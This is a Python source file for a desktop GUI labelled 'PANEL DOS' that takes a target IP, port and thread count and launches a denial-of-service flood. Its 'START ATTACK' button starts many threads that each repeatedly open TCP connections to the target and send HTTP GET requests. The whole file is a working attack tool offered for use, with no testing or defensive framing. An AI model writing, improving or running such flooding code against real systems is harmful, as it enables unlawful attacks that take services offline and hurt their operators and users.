import tkinter as tk
from tkinter import messagebox
import threading
import time
import socket
import sys
import os
from PIL import Image, ImageTk
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.dirname(os.path.abspath(__file__))  
    return os.path.join(base_path, relative_path)
class LaPulgaApp:
    def __init__(self, root):
        self.root = root
        self.root.title("DOS tool panel")
        self.root.geometry("600x480")
        self.root.resizable(False, False)
        self.is_running = False
        self.packet_count = 0
        self.setup_ui()
    def setup_ui(self):
        self.canvas = tk.Canvas(self.root, width=600, height=480, bg="black", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        img_found = False
        try:
            img_path = resource_path("IMAGE") #<———— put the file path here
            print(f"search image {img_path}")
            
            if os.path.exists(img_path):
                original_img = Image.open(img_path)
                resized_img = original_img.resize((600, 480), Image.Resampling.LANCZOS)
                self.bg_image = ImageTk.PhotoImage(resized_img)
                self.canvas.create_image(0, 0, image=self.bg_image, anchor="nw")
                img_found = True
            else:
                print("no background.png found.")
        except Exception as e:
            print(f"Error : {e}")
        if not img_found:
             self.canvas.configure(bg="black")
        self.canvas.create_text(300, 50, text="PANEL DOS", font=("Courier", 30, "bold"), fill="red")
        self.canvas.create_text(300, 80, text="by hide it", font=("Courier", 10, "bold"), fill="gold")
        self.create_input("TARGET IP:", 140, "127.0.0.1", "ip")
        self.create_input("PORT:", 180, "135", "port")
        self.create_input("THREADS:", 220, "200", "threads")
        self.btn_start = tk.Button(self.root, text="START ATTACK", bg="#900", fg="white", font=("Courier", 12, "bold"), command=self.start_attack)
        self.canvas.create_window(200, 300, window=self.btn_start, width=150, height=40)
        self.btn_stop = tk.Button(self.root, text="STOP", bg="#444", fg="white", font=("Courier", 12, "bold"), command=self.stop_attack, state=tk.DISABLED)
        self.canvas.create_window(400, 300, window=self.btn_stop, width=150, height=40)
        self.log_box = tk.Listbox(self.root, bg="black", fg="#0F0", font=("Courier", 9), border=10)
        self.canvas.create_window(300, 400, window=self.log_box, width=580, height=120)
    def create_input(self, label_text, y_pos, default_val, var_name):
        self.canvas.create_text(150, y_pos, text=label_text, font=("Courier", 11, "bold"), fill="white", anchor="w")
        entry = tk.Entry(self.root, font=("Courier", 11), bg="#111", fg="white", insertbackground="white", bd=1, justify="center")
        entry.insert(0, default_val)
        self.canvas.create_window(400, y_pos, window=entry, width=200)
        setattr(self, f"entry_{var_name}", entry)
    def update_log(self, msg):
        self.log_box.insert(tk.END, msg)
        self.log_box.see(tk.END)
        if self.log_box.size() > 50:
            self.log_box.delete(0)
    def hammer_worker(self, target_ip, target_port):
        payload = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Moz/5.0\r\n\r\n".encode()
        while self.is_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, int(target_port)))
                s.send(payload)
                s.close()
                self.packet_count += 1

                if self.packet_count % 50 == 0:
                     self.root.after(0, lambda: self.update_log(f"[*] Paquet envoyé vers {target_ip}..."))
            except:
                time.sleep(0.5)
    def start_attack(self):
        self.is_running = True
        self.packet_count = 0
        self.btn_start.config(state=tk.DISABLED, bg="#333")
        self.btn_stop.config(state=tk.NORMAL, bg="red")
        self.update_log("[*] INITIALISATION DE L'ATTAQUE...")
        try:
            thread_count = int(self.entry_threads.get())
            target_ip = self.entry_ip.get()
            target_port = int(self.entry_port.get())
            for _ in range(thread_count):
                threading.Thread(target=self.hammer_worker, args=(target_ip, target_port), daemon=True).start()       
        except ValueError:
            messagebox.showerror("Erreur", "Vérifie les chiffres !")
            self.stop_attack()
    def stop_attack(self):
        self.is_running = False
        self.btn_start.config(state=tk.NORMAL, bg="#900")
        self.btn_stop.config(state=tk.DISABLED, bg="#444")
        self.update_log("[!] ATTAQUE ARRÊTÉE.")
if __name__ == "__main__":
    root = tk.Tk()
    app = LaPulgaApp(root)
    root.mainloop()